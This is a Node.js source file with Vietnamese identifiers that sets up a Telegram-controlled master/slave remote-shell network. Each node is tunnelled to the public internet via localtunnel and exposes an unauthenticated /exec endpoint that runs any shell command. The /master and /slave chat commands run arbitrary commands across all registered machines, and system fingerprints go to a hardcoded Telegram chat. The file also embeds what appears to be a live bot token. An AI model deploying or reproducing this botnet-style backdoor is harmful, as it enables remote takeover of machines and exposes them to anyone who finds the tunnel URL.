const express=require('express'),TelegramBot=require('node-telegram-bot-api'),localtunnel=require('localtunnel'),{exec}=require('child_process'),https=require('https'),os=require('os');
const TOKEN='7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts',ID_NHOM='7371969470',CONG=Math.floor(Math.random()*2000)+8000,TEN_MAY=os.hostname(),LA_MASTER=process.env.MASTER==='true',URL_MASTER=process.env.MASTER_URL;
const app=express();app.use(express.json());const bot=new TelegramBot(TOKEN,{polling:false});
let danhSachSlave=[],thoiDiemBatDau=Math.floor(Date.now()/1000);

const chayLenh=(l,cb)=>{exec(l,(_,k)=>cb((k||'').trim()));};
const thongBaoMatKetNoi=(u)=>{const s=danhSachSlave.find(x=>x.url===u);if(s)bot.sendMessage(ID_NHOM,`⚠️ Slave ${s.stt} ${s.tenMay} mất kết nối!`);danhSachSlave=danhSachSlave.filter(x=>x.url!==u);};
const guiRequest=(o,d,cb)=>{const r=https.request(o,p=>{let d='';p.on('data',c=>d+=c);p.on('end',()=>cb(d));});r.on('error',()=>cb(''));if(d)r.write(d);r.end();};
setInterval(()=>{const n=Date.now();danhSachSlave.forEach(s=>{if(n-s.lanCuoiPing>10000)thongBaoMatKetNoi(s.url);});},2000);

app.post(`/bot${TOKEN}`,(req,res)=>{
  const m=req.body?.message;if(!m?.text||m.date<thoiDiemBatDau)return res.sendStatus(200);
  const t=m.text.trim(),g=(x)=>bot.sendMessage(m.chat.id,x,{parse_mode:'Markdown'});
  if(t==='/help'){g('/status - Kiểm tra bot\n/slave <lệnh> - Chạy lệnh slave\n/master <lệnh> - Chạy lệnh master\n/help - Trợ giúp');return res.sendStatus(200);}
  if(t==='/status'){
    Promise.all([
      new Promise(r=>chayLenh('uptime',k=>r({loai:'master',ten:TEN_MAY,uptime:k,port:CONG}))),
      ...danhSachSlave.map(s=>new Promise(r=>guiRequest({hostname:new URL(s.url).hostname,path:'/uptime',method:'GET'},null,d=>r({loai:'slave',ten:`${s.tenMay} (${s.stt})`,uptime:d.trim(),port:s.port}))))
    ]).then(a=>{
      let k=`🟢 *Bots online (${a.length}):*\n\n`;a.forEach(b=>k+=`${b.loai==='master'?'👑 *Master*':'🤖 *Slave*'}: ${b.ten}\n*Port:* ${b.port}\n*Uptime:* \`${b.uptime}\`\n\n`);
      g(k);
    });return res.sendStatus(200);
  }
  if(t.startsWith('/slave')){
    const l=t.slice(6).trim();if(!l){g('⚠️ Nhập lệnh sau /slave');return res.sendStatus(200);}
    if(!danhSachSlave.length){g('⚠️ Không có slave nào online');return res.sendStatus(200);}
    g(`🔄 Đang thực hiện \`${l}\` trên ${danhSachSlave.length} ${danhSachSlave.length>1?'Slaves':'Slave'}...`);
    danhSachSlave.forEach(({url,tenMay,stt,port})=>guiRequest({hostname:new URL(url).hostname,path:'/exec',method:'POST',headers:{'Content-Type':'application/json'}},JSON.stringify({cmd:l}),d=>g(`💻 *Slave ${stt} ${tenMay} (Port:${port}):*\n\`\`\`\n${d.trim()}\n\`\`\``)));return res.sendStatus(200);
  }
  if(t.startsWith('/master')){
    const l=t.slice(7).trim();if(!l){g('⚠️ Nhập lệnh sau /master');return res.sendStatus(200);}
    g(`🔄 Đang thực hiện \`${l}\` trên Master...`);
    exec(l,(e,o,err)=>g(`💻 *Master ${TEN_MAY} (Port:${CONG}):*\n\`\`\`\n${(o||err||e?.message||'Không có output').trim()}\n\`\`\``));return res.sendStatus(200);
  }
  res.sendStatus(200);
});

app.post('/exec',(req,res)=>{chayLenh(req.body?.cmd||'',k=>res.send(k));});
app.get('/uptime',(req,res)=>{chayLenh('uptime',k=>res.send(k));});
app.post('/register',(req,res)=>{const{p,u,h,r}=req.body||{};if(!p||!u||!h)return res.sendStatus(400);
  const s=danhSachSlave.length+1;danhSachSlave.push({port:p,url:u,tenMay:h,lanCuoiPing:Date.now(),stt:s});
  chayLenh('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)',k=>bot.sendMessage(ID_NHOM,`📩 *Slave ${s} đăng ký:*\n*Tên máy:* ${h}\n*Port:* ${p}\n*URL:* ${u}\n\n\`\`\`\n${k||r||''}\n\`\`\``,{parse_mode:'Markdown'}));res.sendStatus(200);
});
app.post('/ping',(req,res)=>{const s=danhSachSlave.find(x=>x.url===req.body?.url);if(s)s.lanCuoiPing=Date.now();res.sendStatus(200);});

app.listen(CONG,async()=>{
  try{
    const t=await localtunnel({port:CONG,subdomain:`negancsl${Math.floor(Math.random()*900)+100}`}),u=t.url;
    console.log(`🚀 Cổng ${CONG}\n🌍 URL ${u}`);
    chayLenh('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)',k=>{
      if(LA_MASTER){
        bot.setWebHook(`${u}/bot${TOKEN}`);
        bot.sendMessage(ID_NHOM,`👑 *Master khởi động*\n*Máy chủ:* ${TEN_MAY}\n*Port:* ${CONG}\n*URL:* ${u}\n\n\`\`\`\n${k}\n\`\`\``,{parse_mode:'Markdown'});
        bot.sendMessage(ID_NHOM,`💡 *Chạy slave:*\n\`\`\`\nMASTER_URL=${u} node bot.js\n\`\`\``,{parse_mode:'Markdown'});
      }else if(URL_MASTER){
        guiRequest({hostname:new URL(URL_MASTER).hostname,path:'/register',method:'POST',headers:{'Content-Type':'application/json'}},JSON.stringify({port:CONG,url:u,hostname:TEN_MAY,report:k}),()=>{});
        setInterval(()=>guiRequest({hostname:new URL(URL_MASTER).hostname,path:'/ping',method:'POST',headers:{'Content-Type':'application/json'}},JSON.stringify({url:u}),()=>{}),3000);
      }
    });
  }catch(e){console.error('Lỗi localtunnel:',e);}
});